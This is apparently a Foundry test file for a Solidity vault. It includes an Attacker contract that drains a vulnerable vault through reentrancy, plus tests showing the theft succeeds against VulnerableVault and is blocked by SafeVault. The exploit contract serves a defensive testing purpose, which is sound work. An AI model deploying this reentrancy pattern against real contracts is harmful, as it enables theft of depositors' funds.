// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IVault, VulnerableVault, SafeVault} from "../src/Vault.sol";

/// @notice Deposits 1 ETH, then re-enters withdraw() from receive() until the vault is empty.
contract Attacker {
    IVault immutable vault;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw(); // re-entry
        }
    }
}

contract VaultTest is Test {
    address victim = makeAddr("victim");

    function _fund(IVault vault) internal {
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function test_ReentrancyDrainsVulnerableVault() public {
        VulnerableVault vault = new VulnerableVault();
        _fund(vault);
        Attacker attacker = new Attacker(vault);

        attacker.attack{value: 1 ether}();

        // The attacker put in 1 ETH and took out the victim's 10 as well.
        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, 11 ether);
    }

    function test_SafeVaultBlocksReentrancy() public {
        SafeVault vault = new SafeVault();
        _fund(vault);
        Attacker attacker = new Attacker(vault);

        // The re-entrant call reverts, so the ETH send fails and the whole tx reverts.
        vm.expectRevert(SafeVault.SendFailed.selector);
        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 10 ether);
    }
}
